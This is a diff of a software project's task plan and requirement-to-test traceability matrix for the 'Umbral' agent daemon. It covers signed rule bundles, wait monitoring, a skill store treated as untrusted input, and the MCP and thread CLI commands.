+- **Note (delta `2026-10-policy-explain`, decision 9):** the agent runtime and `policy.explain` both call `domain.Decide` with the built-in destructive list; the list loaded here must reach both through one shared `Policy`, or an explanation would describe a policy the daemon does not apply.
 - **REQ:** REQ-SEC-010, REQ-SEC-011
-- **Files:** `internal/security/rules/**`, `internal/config/**`
+- **Files:** `internal/security/rules/**`, `internal/config/**`; moved and widened by delta `2026-10-rule-overrides` to `internal/security/adapters/rules/**`, `internal/security/domain/ruleset*.go`, `internal/security/ports/rules.go`, `internal/agents/{runtime,turn}.go` (`Config.Policy`) and `cmd/umbrald/{rules,main,agents,gateway,mcp,policy}.go`
 - **Depends on:** T-F1-04
 - **Done:** `TestLocalRulesWin_REQ_SEC_010` and `TestRuleUpdateOptInAndLogged_REQ_SEC_011` green; with `rules_check = false` no request leaves the machine.
 
-### [ ] T-F1-30 · Signed rule bundles, trust store and recovery
+### [x] 2026-10-18 T-F1-30 · Signed rule bundles, trust store and recovery
 - **What:**
   - bundle format (rules + version + Ed25519 detached signature) and verification against `trust_keys`;
   - monotonic version check and rejection with a logged reason plus `rules.update_rejected`;
   - `rules.key.add|list|remove|rotate` with fingerprint confirmation and protection of the last key;
   - fail-closed after three failures or with no valid key;
   - `rules.rollback` and `rules.reset`, both offline and without needing a key;
-  - `rules.status` reporting the active bundle, the previous one, the keys and the last rejection.
+  - `rules.status` reporting the active bundle, the previous one, the keys and the last rejection;
+  - the bundle and signature formats, the trust seed built into the binary (matched by fingerprint, never reopening fail-closed), removal as revocation, and revocation discarding the bundles a key verified (delta `2026-09-rule-signing-custody`);
+  - `tools/rulesign` (`keygen`, `sign`, `verify`), reading the private key from stdin only, for the procedures of `docs/runbooks/rule-signing.md`.
 - **REQ:** REQ-SEC-011, REQ-SEC-013, REQ-SEC-014, REQ-SEC-015, REQ-SEC-016
-- **Files:** `internal/security/rules/bundle*.go`, `internal/security/rules/trust*.go`, `internal/api/rules.go`, `cmd/umb/rules.go`
+- **Files:** `internal/security/domain/bundle.go`, `internal/security/domain/rulestate.go`, `internal/security/rules.go`, `internal/security/ports/rules.go`, `internal/security/adapters/rules/store.go`, `internal/security/adapters/rules/fetch.go`, `internal/security/adapters/rules/trustseed/` (moved under `adapters/` by delta `2026-10-rule-overrides`, decision 8), `internal/store/migrations/0006_rule_state.sql`, `internal/api/rules.go`, `cmd/umbrald/rules.go`, `cmd/umb/rules.go`, `tools/rulesign/` (widened by delta `2026-10-signed-rule-bundles`)
 - **Depends on:** T-F1-29
-- **Done:** tests `TestBundleRequiresValidSignature_REQ_SEC_011`, `TestRejectsUnknownKeyAndDowngrade_REQ_SEC_013`, `TestKeyLifecycleRequiresFingerprint_REQ_SEC_014`, `TestFailClosedAfterThreeFailures_REQ_SEC_015` and `TestRollbackAndResetWorkOffline_REQ_SEC_016` green; the recovery case (every key removed with `--force`, then `rules.reset`) is covered end to end.
+- **Done:** tests `TestBundleRequiresValidSignature_REQ_SEC_011`, `TestAnySignatureOfAValidKeyVerifies_REQ_SEC_011`, `TestRulesignVerifiesLikeTheDaemon_REQ_SEC_011`, `TestRejectsUnknownKeyAndDowngrade_REQ_SEC_013`, `TestAnUnchangedBundleIsUpToDate_REQ_SEC_013`, `TestKeyLifecycleRequiresFingerprint_REQ_SEC_014`, `TestTrustSeedMatchesByFingerprint_REQ_SEC_014`, `TestRemoveRevokesAndDiscardsBundles_REQ_SEC_014`, `TestFailClosedAfterThreeFailures_REQ_SEC_015`, `TestSeedDoesNotReopenFailClosed_REQ_SEC_015`, `TestAddOfSeededKeyReopensFailClosed_REQ_SEC_015` and `TestRollbackAndResetWorkOffline_REQ_SEC_016` green; each rejected bundle calls `obs.Metrics.RuleUpdateRejected(reason)`, so `umbral_rule_updates_rejected_total` counts it (REQ-OBS-004, delta `2026-10-otel`); the recovery case (every key removed with `--force`, then `rules.reset`) is covered end to end; `tools/rulesign` is mapped in `.go-arch-lint.yml` and covered by `task lint`.
 
-### [ ] T-F1-31 · Wait monitoring and lifecycle
+### [x] 2026-10-18 T-F1-31 · Wait monitoring and lifecycle
 - **What:**
   - enforcement of the concurrency and rate limits with the responses from REQ-AUT-005;
   - `wait.list` with age and stalled flag;
@@ -305,91 +386,196 @@ default CI.
   - stall detection per turn with a configurable window and the `thread.stalled` notification;
   - `umb wait ls` and `umb wait cancel` on the CLI.
 - **REQ:** REQ-AUT-005, REQ-AUT-006, REQ-AUT-007, REQ-AUT-008
-- **Files:** `internal/waits/**`, `internal/api/waits.go`, `cmd/umb/wait.go`
+- **Files:** `internal/waits/**`, `internal/api/waits.go`, `cmd/umb/wait.go`; widened by delta `2026-10-wait-monitoring`: `internal/agents/stall.go`, `internal/agents/runtime.go`, `internal/llmgw/router.go`, `internal/agents/{domain/thread.go,ports/events.go,ports/ports.go}`, `internal/integrations/{rate,integrations,metadata}.go`, `internal/config/settings.go`, `internal/obs/metrics.go`, `internal/api/{threads,notify,system,schema,errors}.go`, `internal/store/ids.go`, `cmd/umbrald/{stall,agents,waits,integrations,main}.go`, `cmd/umb/main.go`
 - **Depends on:** T-F1-23
-- **Done:** tests `TestLimitsDegradeWithoutDisconnect_REQ_AUT_005`, `TestWaitListReportsAgeAndStalled_REQ_AUT_006`, `TestCancelLeavesTurnRunning_REQ_AUT_007` and `TestStalledTurnNotifiedNotKilled_REQ_AUT_008` green; a script that leaks 100 waits does not bring the connection down.
+- **Done:** tests `TestLimitsDegradeWithoutDisconnect_REQ_AUT_005`, `TestWaitListReportsAgeAndStalled_REQ_AUT_006`, `TestCancelLeavesTurnRunning_REQ_AUT_007` and `TestStalledTurnNotifiedNotKilled_REQ_AUT_008` green; a stalled turn calls `obs.Metrics.WaitStalled` and a discarded report `obs.Metrics.ReportRateLimited`, so `umbral_waits_stalled_total` and `umbral_reports_rate_limited_total` count them (REQ-OBS-004, delta `2026-10-otel`); a script that leaks 100 waits does not bring the connection down.
+
+### [x] 2026-10-18 T-F1-34 · Skill store and `skill.*` methods
+- **What:**
+  - **Bundle checks:** front matter; entry kinds; paths; modes; size and entry limits enforced
+    while streaming; the canonical-manifest digest.
+  - **Store:** staging and rename into `$XDG_DATA_HOME/umbral/skills/<name>/`; the recovery
+    sweep of Data Model §6.
+  - **Methods:** `skill.inspect`, `install` (with `expected_sha256`), `list`, `get`,
+    `set_enabled` and `remove`, plus `skill.changed`.
+  - **Rules:** local sources only, classified before resolving; at most 64 enabled, and a 65th
+    install is stored disabled.
+  - **Arch:** the `api` rows. The `skills` table is created by T-F1-01 (Data Model §2.4f).
+  - **Spec edits:** API §2–§6 and §9; Tech §3.2 (`context` gains the skill store and catalog).
+- **REQ:** REQ-SKL-001, REQ-SKL-002, REQ-SKL-006
+- **Files:** `internal/context/**`, `internal/store/**`, `internal/api/**`, `.go-arch-lint.yml`,
+  `specs/api/umbral-daemon-api-v1.md`, `specs/technical/umbral-architecture.md`; widened by delta
+  `2026-10-skill-store`: `cmd/umbrald/{skills,main}.go`, `specs/data-model/umbral-schema.md`
+- **Depends on:** T-F1-01 (0005 includes `skills`)
+- **Delta:** `changes/_archive/2026-09-skills-cli/`
+- **Done:** these are green and `task schema` and `task arch` are green:
+  - `TestInstallCopiesRecordsAndRunsNothing_REQ_SKL_001`;
+  - `TestABadBundleIsRefusedWhole_REQ_SKL_002`;
+  - `TestACrashMidInstallLeavesNothingAfterRestart_REQ_SKL_002`;
+  - `TestARemoteSourceIsRefused_REQ_SKL_006`.
+
+### [x] 2026-10-18 T-F1-35 · `umb skill`
+- **What:** `umb skill install|list|show|enable|disable|remove`; inspect, confirm, then install
+  with the shown digest; `--yes`, `--replace` and `--json`.
+- **REQ:** REQ-SKL-001, REQ-SKL-003
+- **Files:** `cmd/umb/**`, `specs/technical/umbral-architecture.md`; delta `2026-10-umb-skill`
+- **Depends on:** T-F1-34
+- **Done:** `TestInstallAsksOrNeedsYes_REQ_SKL_001` and
+  `TestSkillCommandsMirrorTheMethods_REQ_SKL_003` green.
+
+### [x] 2026-10-18 T-F1-36 · Umbral's agent sees skills, loads them on demand, and treats them as untrusted
+- **What:**
+  - **Catalog:** in every prompt, capped at 256 characters per description and 64 skills,
+    inside the budget; rebuilt per turn, so changes reach the next turn.
+  - **`skill_load`:** a `ReadOnly` tool behind a `tools/ports.SkillReader`; `file` confined to
+    the bundle; its output taints the turn (REQ-SEC-006).
+  - **Destructive patterns:** `umb skill install|enable|remove` and `umb mcp add` join the list.
+  - **Spec edits:** Tech §3.2 (`tools` gains `skill_load`) and §5.3 (the destructive patterns).
+- **REQ:** REQ-SKL-004, REQ-SKL-005, REQ-SKL-007
+- **Files:** `internal/context/**`, `internal/tools/**`, `internal/security/**`, `cmd/umbrald/**`,
+  and, by delta `2026-10-skill-catalog`, `internal/agents/{runtime,turn}.go` (the per-turn catalog),
+  `specs/technical/umbral-architecture.md`
+- **Depends on:** T-F1-09, T-F1-11, T-F1-12, T-F1-14, T-F1-34
+- **Done:** these are green:
+  - `TestPromptCarriesDescriptionsNotBodies_REQ_SKL_004`;
+  - `TestASkillCannotRunOrWidenAnything_REQ_SKL_005`;
+  - `TestASkillChangeReachesTheNextTurn_REQ_SKL_007`.
+
+### [x] 2026-10-18 T-F1-37 · `umb mcp`, and the agent panel's extensions view
+- **What:**
+  - `umb mcp add|list|remove`, with `--stdio -- <command>`, `--http <url>`,
+    `--env NAME=keyring:<path>` and `--json`; always `untrusted`; plaintext `--env` refused in
+    the CLI;
+  - API §2's `cli` row gains the three `mcp.server.*` methods; §5.27 gains `remove`'s and
+    `list`'s params;
+  - `--env` accepts `keyring:` and `env:` references and refuses anything else;
+  - the agent panel lists MCP servers with their live state and skills with enabled or not, and
+    for each turn the MCP tools called and the skills loaded.
+- **REQ:** REQ-CLI-008, REQ-TUI-004
+- **Files:** `cmd/umb/**`, `internal/api/system.go`, `internal/tui/agent/**`,
+  `specs/api/umbral-daemon-api-v1.md`, `specs/technical/umbral-architecture.md`; moved by delta
+  `2026-10-umb-mcp-panel` to `internal/api/mcp.go` (the kinds live with the methods) and
+  `internal/tui/{agent,commands,model,update}.go`, `internal/tui/ports/ports.go` and
+  `internal/tui/adapters/daemon/daemon.go` (the panel is part of the model, Tech §5.3e)
+- **Depends on:** T-F1-17, T-F1-20, T-F1-35
+- **Delta:** `changes/_archive/2026-09-cli-mcp/`, `changes/_archive/2026-10-umb-mcp-panel/`
+- **Done:** `TestMcpCommandsMirrorTheMethods_REQ_CLI_008`, `TestCliMayManageMcpServers_REQ_CLI_008`
+  and `TestAgentPanelShowsServersAndSkills_REQ_TUI_004` green.
+
+### [x] 2026-10-22 T-F1-38 · `umb thread`: a script drives a thread and waits without polling
+- **What:**
+  - API §2's `cli` row gains `thread.wait` and `thread.get`; `thread.list`, `update`, `focus` and
+    `approval.*` stay interactive;
+  - `umb thread create|send|wait|get|cancel`, one call each, printing the thread id, the turn id
+    (and the final state with `--wait`), the state a wait answered, or the messages; `--json`;
+    `TIMEOUT` is exit 1 naming the last state.
+- **REQ:** REQ-CLI-009, REQ-AUT-001, REQ-AUT-004
+- **Files:** `cmd/umb/thread.go`, `cmd/umb/main.go`, `internal/api/threads.go`,
+  `internal/api/waits.go`, `specs/api/umbral-daemon-api-v1.md`, `specs/prd/umbral-mvp.md`,
+  `specs/technical/umbral-architecture.md`
+- **Depends on:** T-F1-19, T-F1-23
+- **Delta:** `changes/_archive/2026-10-cli-thread-wait/`
+- **Done:** `TestThreadCommandsDriveAThread_REQ_CLI_009`, `TestThreadWaitTimeoutExitsOne_REQ_CLI_009`,
+  `TestThreadGetPrintsEveryPage_REQ_CLI_009` and `TestThreadWaitAndGetServeTheCLI_REQ_CLI_009`
+  green. F1 criterion 4 is then performed with `umb thread` alone against a real daemon by
+  F1's closing measurement, which records it in the closing checkpoint.
 
 ## Traceability matrix (F1)
 
 | REQ | Tasks | Tests citing it |
 |---|---|---|
-| REQ-AGT-001 | T-F1-13, T-F1-21 | TestSendStreamsDeltas_REQ_AGT_001, e2e us003 |
-| REQ-AGT-002 | T-F1-09 | TestToolSchemasDeclared_REQ_AGT_002 |
-| REQ-AGT-003 | T-F1-10 | TestRunCommandCreatesAgentBlock_REQ_AGT_003 |
-| REQ-AGT-004 | T-F1-14 | TestAskPausesTurn_REQ_AGT_004 |
-| REQ-AGT-005 | T-F1-14 | TestDenyReturnsDeniedByUser_REQ_AGT_005 |
-| REQ-AGT-006 | T-F1-15 | TestInvalidArgsRepairOnce_REQ_AGT_006 |
-| REQ-AGT-007 | T-F1-10, T-F1-16 | TestCancelUnder500ms_REQ_AGT_007 |
-| REQ-AGT-008 | T-F1-13 | TestStopsAtMaxSteps_REQ_AGT_008 |
+| REQ-AGT-001 | T-F1-13, T-F1-21 | TestSendStreamsDeltas_REQ_AGT_001, TestUS003FixItOffline_REQ_AGT_001 (live, `e2e/us003/run.sh`) |
+| REQ-AGT-002 | T-F1-09 | TestToolSchemasDeclared_REQ_AGT_002, TestInvalidInputIsRefused_REQ_AGT_002, TestRegistrationChecksTheSpec_REQ_AGT_002, TestReadsAreBounded_REQ_AGT_002 |
+| REQ-AGT-003 | T-F1-10 | TestRunCommandCreatesAgentBlock_REQ_AGT_003, TestAClaimMarksTheNextBlockOnly_REQ_AGT_003, TestRunCommandRunsInTheThreadsTerminal_REQ_AGT_003, TestParallelFirstUsesShareOnePTY_REQ_AGT_003, TestAPromptHookIsNotTakenForTheNextCommand_REQ_AGT_003 (T-HRD-03) |
+| REQ-AGT-004 | T-F1-09, T-F1-14 | TestAskPausesTurn_REQ_AGT_004, TestAThreadScopeRemembersTheDecision_REQ_AGT_004, TestAGlobInTheTargetIsNotRemembered_REQ_AGT_004, TestACompoundLineIsNotRemembered_REQ_AGT_004, TestACancelledTurnExpiresItsApproval_REQ_AGT_004, TestAnAnswerRacingACancelIsACancel_REQ_AGT_004, TestAnApprovalRoundTripsThroughARealDaemon_REQ_AGT_004; T-F1-09: TestNoToolRunsWithoutAGrant_REQ_AGT_004 |
+| REQ-AGT-005 | T-F1-14 | TestDenyReturnsDeniedByUser_REQ_AGT_005, TestARememberedDenyAppliesToTheRestOfTheTurn_REQ_AGT_005 |
+| REQ-AGT-006 | T-F1-15, T-F1-21 | TestInvalidArgsRepairOnce_REQ_AGT_006; also TestTheRepairNamesWhatIsWrong_REQ_AGT_006 (T-F1-21), TestARepairedCallRuns_REQ_AGT_006, TestEachInvalidCallGetsItsOwnRepair_REQ_AGT_006, TestAnUnknownToolIsRepairedLikeBadArgs_REQ_AGT_006, TestInputThatIsNotJSONNeverRuns_REQ_AGT_006, TestEmptyInputIsAnEmptyObject_REQ_AGT_006, TestADaemonFaultIsNotTheModels_REQ_AGT_006, TestTheRetryStepStopsAtItsInvalidCall_REQ_AGT_006 |
+| REQ-AGT-007 | T-F1-10, T-F1-16 | TestCancelUnder500ms_REQ_AGT_007 (T-F1-16, through `thread.cancel` on a real daemon); also TestCancelStopsARunningTurn_REQ_AGT_007, TestCancelWithNoTurnStopsNothing_REQ_AGT_007, TestCancelWhileAwaitingApproval_REQ_AGT_007, TestACancelRacingTheTurnsOwnEndStopsNothing_REQ_AGT_007, TestStoppedAtIsTheRecordedEnd_REQ_AGT_007, TestClosingTheDaemonStopsTheTurn_REQ_AGT_007, TestThreadCancelReachesTheWire_REQ_AGT_007; T-F1-10: TestKillForegroundUnder500ms_REQ_AGT_007 (the kill itself, from a cancelled context), TestACancelBeforeTheCommandStartsStillStopsIt_REQ_AGT_007 (a cancel that lands before OSC 133;C waits for the command to start); fix 2026-10-03: TestACancelAfterTheFirstTokenIsAnError_REQ_AGT_007 (a cancel after the first event is an error, never a clean end); tag `live`: TestLiveCancelWhileGenerating_REQ_AGT_007, TestLiveCancelDuringCommand_REQ_AGT_007, TestALateInterruptDoesNotEatTheNextCommand_REQ_AGT_007 (T-HRD-03) |
+| REQ-AGT-008 | T-F1-13, delta `2026-10-cost-cap` | TestStopsAtMaxSteps_REQ_AGT_008; the cost cap: TestACostCapStopsTheTurn_REQ_AGT_008, TestASpentCostCapRefusesTheSend_REQ_AGT_008, TestTheCostCapCountsEarlierTurns_REQ_AGT_008, TestACompactionThatReachesTheCapStopsTheTurn_REQ_AGT_008, TestTheCostCapFollowsModelsToml_REQ_AGT_008, TestTheDaemonEnforcesTheCostCap_REQ_AGT_008 |
 | REQ-AGT-009 | T-F1-03, T-F1-13 | TestAskModeReadOnlyTools_REQ_AGT_009 |
 | REQ-AGT-010 | T-F1-13 | TestModelSwitchNextTurn_REQ_AGT_010 |
-| REQ-AGT-011 | T-F1-01, T-F1-13, T-F1-22 | TestPersistBeforeNotify_REQ_AGT_011, TestCrashRecovery_REQ_AGT_011 |
-| REQ-AGT-013 | T-F1-03 | TestPolicyAutoEditWorkspace_REQ_AGT_013 |
-| REQ-AGT-014 | T-F1-03 | TestPolicyNormalDefaultAsk_REQ_AGT_014 |
+| REQ-AGT-011 | T-F1-01, T-F1-13, T-F1-22 | TestRecoveryExpiresPendingApprovals_REQ_AGT_011, TestPersistBeforeNotify_REQ_AGT_011, TestCrashRecovery_REQ_AGT_011 |
+| REQ-AGT-013 | T-F1-03, T-F1-09 | TestPolicyAutoEditWorkspace_REQ_AGT_013; T-F1-09: TestTheTargetFollowsSymlinks_REQ_AGT_013, TestAGrantDoesNotSurviveASwappedLink_REQ_AGT_013, TestAWriteStaysUnderItsDirectory_REQ_AGT_013, TestARelativeEnvIsRefused_REQ_AGT_013, TestTheWriteUsesTheCheckedTarget_REQ_AGT_013 |
+| REQ-AGT-014 | T-F1-03, T-F1-09 | TestPolicyNormalDefaultAsk_REQ_AGT_014; T-F1-09: TestAToolCannotLowerItsRisk_REQ_AGT_014 |
 | REQ-CTX-001 | T-F1-11 | TestRulesFilesPrecedence_REQ_CTX_001 |
 | REQ-CTX-002 | T-F1-11 | TestAttachments_REQ_CTX_002 |
 | REQ-CTX-003 | T-F1-11 | TestGitContext_REQ_CTX_003 |
-| REQ-CTX-004 | T-F1-12 | TestCompactionTriggeredOverWindow_REQ_CTX_004 |
+| REQ-CTX-004 | T-F1-12, T-F1-13 | TestCompactionTriggeredOverWindow_REQ_CTX_004; T-F1-13: TestCompactedEventPersistedThenPublished_REQ_CTX_004 |
 | REQ-CTX-005 | T-F1-11 | TestAttachmentTruncated_REQ_CTX_005 |
-| REQ-LLM-001 | T-F1-05, T-F1-06 | TestStreamNormalized_REQ_LLM_001 |
-| REQ-LLM-002 | T-F1-05 | TestDiscoverModels_REQ_LLM_002 |
-| REQ-LLM-003 | T-F1-07 | TestFallbackOn429_REQ_LLM_003 |
-| REQ-LLM-004 | T-F1-07, T-F1-21 | TestOfflineRejectsRemote_REQ_LLM_004 |
-| REQ-LLM-005 | T-F1-01, T-F1-07 | TestUsageRecorded_REQ_LLM_005 |
-| REQ-LLM-006 | T-F1-06 | TestOllamaSendsNumCtx_REQ_LLM_006 |
-| REQ-SEC-001 | T-F1-04, T-F1-07 | TestRedactionCorpus_REQ_SEC_001 |
-| REQ-SEC-002 | T-F1-01, T-F1-07, T-F1-21 | TestEgressLoggedForRemote_REQ_SEC_002 |
-| REQ-SEC-004 | T-F1-02 | TestPlaintextKeyRejected_REQ_SEC_004 |
-| REQ-SEC-005 | T-F1-03, T-F1-14 | TestDestructiveAlwaysAsk_REQ_SEC_005 |
+| REQ-LLM-001 | T-F1-05, T-F1-06 | TestStreamNormalized_REQ_LLM_001, TestOpenRouterStreamsThroughTheConfiguredBaseURL_REQ_LLM_001, TestEveryProviderTypeGetsItsAdapter_REQ_LLM_001; T-F1-06: TestOllamaStreamsNormalized_REQ_LLM_001, TestOllamaLive (tag `live`); T-F1-07: TestWhatTheAdapterCannotCarryIsRefused_REQ_LLM_001 |
+| REQ-LLM-002 | T-F1-05 | TestDiscoverModels_REQ_LLM_002, TestDiscoverOpenRouterModels_REQ_LLM_002, TestCatalogDiscoversEveryProvider_REQ_LLM_002, TestTheCatalogPersists_REQ_LLM_002, TestModelListReachesTheWire_REQ_LLM_002, TestADaemonDiscoversModelsAtStart_REQ_LLM_002, TestOllamaDiscovers_REQ_LLM_002; fix 2026-10-18 (delta `2026-10-duplicate-models`): TestAModelListedTwiceIsStoredOnce_REQ_LLM_002 |
+| REQ-LLM-003 | T-F1-07 | TestFallbackOn429_REQ_LLM_003, TestAPermanentFailureDoesNotFallBack_REQ_LLM_003, TestAFailureAfterTheFirstTokenIsReturned_REQ_LLM_003, TestEveryCandidateFailing_REQ_LLM_003, TestALocalCandidateGetsTheLocalTimeout_REQ_LLM_003, TestARequestThatCannotBeBuiltIsNotRetried_REQ_LLM_003, TestCandidatesAreFilteredByCapabilityAndHealth_REQ_LLM_003, TestAServerThatHoldsItsHeadersTimesOut_REQ_LLM_003 |
+| REQ-LLM-004 | T-F1-05, T-F1-07, T-F1-21 | TestOfflineRejectsRemote_REQ_LLM_004; T-F1-05: TestOfflineContactsNoRemoteProvider_REQ_LLM_004, TestOfflineReachesTheCatalog_REQ_LLM_004; also exercised live by TestUS003FixItOffline_REQ_AGT_001 (T-F1-21: no `usage` row for the remote candidate) |
+| REQ-LLM-005 | T-F1-01, T-F1-07 | TestUsageRecorded_REQ_LLM_005, TestTheCostRoundsToTheNearestMicroUSD_REQ_LLM_005, TestUsageRowsAreWritten_REQ_LLM_005, TestTheGatewayNeedsAUsageLog_REQ_LLM_005 |
+| REQ-LLM-006 | T-F1-06 | TestOllamaSendsNumCtx_REQ_LLM_006, TestOllamaRefusesABadNumCtx_REQ_LLM_006 |
+| REQ-SEC-001 | T-F1-04, T-F1-07 | TestRedactionCorpus_REQ_SEC_001; T-F1-07: TestRedactionBeforeSending_REQ_SEC_001 |
+| REQ-SEC-002 | T-F1-01, T-F1-05, T-F1-06, T-F1-07, T-F1-09, T-F1-21 | TestEgressLoggedForRemote_REQ_SEC_002; T-F1-05: TestEveryRemoteRequestIsLogged_REQ_SEC_002, TestEgressRowsAreWritten_REQ_SEC_002; T-F1-06: TestOllamaRemoteRequestsAreLogged_REQ_SEC_002; T-F1-07: TestTheCallCarriesItsThread_REQ_SEC_002; T-F1-09: TestFetchIsRedactedAndLogged_REQ_SEC_002; also exercised live by TestUS003FixItOffline_REQ_AGT_001 (T-F1-21: 0 rows in `egress_log`) |
+| REQ-SEC-004 | T-F1-02 | TestPlaintextKeyRejected_REQ_SEC_004, TestASecretInOptionsIsRejected_REQ_SEC_004 |
+| REQ-SEC-005 | T-F1-03, T-F1-14 | TestDestructiveAlwaysAsk_REQ_SEC_005; T-F1-14: TestDestructiveIgnoresAlways_REQ_SEC_005 |
 | REQ-SEC-006 | T-F1-03, T-F1-09 | TestTaintedRequiresAsk_REQ_SEC_006, TestFetchMarksTaint_REQ_SEC_006 |
-| REQ-MCP-001 | T-F1-17 | TestMcpToolsPrefixed_REQ_MCP_001 |
-| REQ-MCP-002 | T-F1-17 | TestMcpAddMidThread_REQ_MCP_002 |
-| REQ-MCP-003 | T-F1-17 | TestMcpReconnectBackoff_REQ_MCP_003 |
+| REQ-MCP-001 | T-F1-17 | TestMcpToolsPrefixed_REQ_MCP_001; also TestToolNamesArePrefixed_REQ_MCP_001, TestAddParamsValidate_REQ_MCP_001, TestRefsParse_REQ_MCP_001, TestRemote_REQ_MCP_001, TestEnvRefsAreResolved_REQ_MCP_001, TestARemoteCallCarryingASecretIsRefused_REQ_MCP_001, TestStartConnectsStoredServers_REQ_MCP_001, TestAStdioServerServesItsTools_REQ_MCP_001, TestAStdioServerGetsOnlyItsEnvironment_REQ_MCP_001, TestAnHTTPServerServesItsTools_REQ_MCP_001, TestEveryRemoteRequestIsRecorded_REQ_MCP_001, TestARemoteServerGoesThroughTheEgressLog_REQ_MCP_001, TestARedirectToAnotherHostIsRefused_REQ_MCP_001, TestTruncateKeepsRunesWhole_REQ_MCP_001, TestADegradedSecretIsReported_REQ_MCP_001, TestAURLCarryingASecretIsRefused_REQ_MCP_001, TestServersRoundTrip_REQ_MCP_001 |
+| REQ-MCP-002 | T-F1-17 | TestMcpAddMidThread_REQ_MCP_002 (a real daemon); also TestAddConnectsAndSyncsTools_REQ_MCP_002, TestRemoveDisconnects_REQ_MCP_002, TestASyncReplacesTheServersTools_REQ_MCP_002, TestAnUnregisteredToolIsUnknown_REQ_MCP_002, TestMcpServerMethodsReachTheWire_REQ_MCP_002, TestAnAddAfterCloseStartsNothing_REQ_MCP_002 |
+| REQ-MCP-003 | T-F1-17 | TestMcpReconnectBackoff_REQ_MCP_003; also TestAFlappingServerIsNotRetriedForever_REQ_MCP_003, TestAServerErrorKeepsItsTaint_REQ_MCP_003, TestBackoffDoubles_REQ_MCP_003, TestAReconnectedServerServesAgain_REQ_MCP_003, TestASilentServerIsUnavailable_REQ_MCP_003, TestACancelledCallLeavesTheServerAlone_REQ_MCP_003, TestACrashedServerEndsItsSession_REQ_MCP_003, TestAFailureTheServerReportsKeepsItsTaint_REQ_MCP_003 |
 | REQ-MCP-004 | T-F1-17 | TestMcpDefaultAsk_REQ_MCP_004 |
-| REQ-CLI-001 | T-F1-19 | TestUmbAiPipesStdin_REQ_CLI_001 |
-| REQ-TUI-001 | T-F1-20 (+ T-F0-12) | TestTUIAgentPanel_REQ_TUI_001 |
+| REQ-CLI-001 | T-F1-19 | TestUmbAiPipesStdin_REQ_CLI_001; also TestUmbAiCapsStdinAtOneMiB_REQ_CLI_001, TestUmbAiFitsStdinToTheFrameLimit_REQ_CLI_001, TestUmbAiOutlivesASlowStdout_REQ_CLI_001, TestUmbAiCancelsOnInterrupt_REQ_CLI_001, TestUmbAiDoesNotGuessAnUnseenEnd_REQ_CLI_001, TestUmbAiAgainstARealDaemon_REQ_CLI_001 (`cmd/umbrald`), TestThreadSendTakesStdinInline_REQ_CLI_001 (`internal/api`), TestAStdinAttachmentNeedsNoGatherer_REQ_CLI_001 (`internal/agents`), TestStdinAttachmentSaysTheClientStoppedReading_REQ_CLI_001 (`internal/context/domain`) |
+| REQ-TUI-001 | T-F1-20 (+ T-F0-12) | TestTUIAgentPanel_REQ_TUI_001; also TestTheAgentPanelAgainstARealDaemon_REQ_TUI_001, TestToEventMapsTheAgentsNotifications_REQ_TUI_001 |
 | REQ-TUI-002 | T-F1-20 | TestModeToggle_REQ_TUI_002 |
 | REQ-TUI-003 | T-F1-20 | TestAttachBlock_REQ_TUI_003 |
-| REQ-OBS-001 | T-F1-18 | TestTurnTraceHasSpans_REQ_OBS_001 |
-| REQ-OBS-002 | T-F1-15 | TestInvalidMetricIncrements_REQ_OBS_002 |
-| REQ-AUT-001 | T-F1-23 | TestWaitPinsTurn_REQ_AUT_001 |
-| REQ-AUT-002 | T-F1-23 | TestSendWaitRejectsBlocked_REQ_AUT_002 |
-| REQ-AUT-003 | T-F1-23 | TestWaitOutputMatchesLine_REQ_AUT_003 |
-| REQ-AUT-004 | T-F1-23 | TestWaitTimeoutReportsLastState_REQ_AUT_004 |
+| REQ-OBS-001 | T-F1-18 | TestTurnTraceHasSpans_REQ_OBS_001; also TestTheRuntimeTracesEachTurn_REQ_OBS_001 (`internal/agents`), TestEveryModelCallIsTraced_REQ_OBS_001 (`internal/llmgw`) |
+| REQ-OBS-002 | T-F1-15, T-F1-18 | TestInvalidMetricIncrements_REQ_OBS_002; also TestToolCallsInvalidCountsPerModel_REQ_OBS_002 (`internal/obs`), TestTheRuntimeRequiresMetrics_REQ_OBS_002; the export through OTel: TestInvalidCallsExported_REQ_OBS_002 (T-F1-18, delta `2026-10-tool-call-repair`) |
+| REQ-AUT-001 | T-F1-23, T-F1-38 | TestWaitPinsTurn_REQ_AUT_001; also TestAWaitOnAThreadAlreadyInATargetReturnsAtOnce_REQ_AUT_001, TestALaterTurnSeenFirstDoesNotAnswerForThePinnedOne_REQ_AUT_001, TestAReplacedTurnAnswersWithItsOwnEnd_REQ_AUT_001, TestSendWaitPinsItsTurnAndReturnsFinalState_REQ_AUT_001, TestSendWithWaitPinsItsOwnTurn_REQ_AUT_001, TestALaterTurnNeverSatisfiesThePinnedWait_REQ_AUT_001, TestAnEndedTurnThatCannotReachATargetSettles_REQ_AUT_001, TestAReplacementTurnDoesNotSatisfyThePinnedWait_REQ_AUT_001, TestTheTurnEndingSettlesTheWait_REQ_AUT_001, TestAnApprovalOfThePinnedTurnIsBlocked_REQ_AUT_001 |
+| REQ-AUT-002 | T-F1-23 | TestSendWaitRejectsBlocked_REQ_AUT_002; also TestSendWithWaitOnABlockedThreadIsRefused_REQ_AUT_002, TestSendWaitRejectsBlockedOnTheWire_REQ_AUT_002 |
+| REQ-AUT-003 | T-F1-23 | TestWaitOutputMatchesLine_REQ_AUT_003; also TestFeedKeepsReadingPastTheStrippersCap_REQ_AUT_003, TestALineHalfOnScreenIsContinued_REQ_AUT_003, TestOutputAlreadyOnScreenMatches_REQ_AUT_003, TestOutputAfterTheStartMatches_REQ_AUT_003, TestAClosedBlockIsReadFromItsOutput_REQ_AUT_003, TestWaitOutputOnTheWire_REQ_AUT_003 |
+| REQ-AUT-004 | T-F1-23, T-F1-38 | TestWaitTimeoutReportsLastState_REQ_AUT_004; also TestATimeoutCarriesTheLastState_REQ_AUT_004, TestAnOutputTimeoutReportsTheLastLine_REQ_AUT_004, TestAWaitTimeoutCarriesLastState_REQ_AUT_004 |
 | REQ-AGT-016 | T-F1-24 | TestDoneUntilFocused_REQ_AGT_016 |
 | REQ-AGT-017 | T-F1-24 | TestThreadsResumeAfterRestart_REQ_AGT_017 |
 | REQ-INT-001 | T-F1-25 | TestEnvInjectedAndAuthoritative_REQ_INT_001 |
-| REQ-INT-002 | T-F1-25 | TestExternalReportDrivesRollup_REQ_INT_002 |
+| REQ-INT-002 | T-F1-01, T-F1-25 | TestRecoveryClearsPaneStateAndMetadata_REQ_INT_002, TestExternalReportDrivesRollup_REQ_INT_002 |
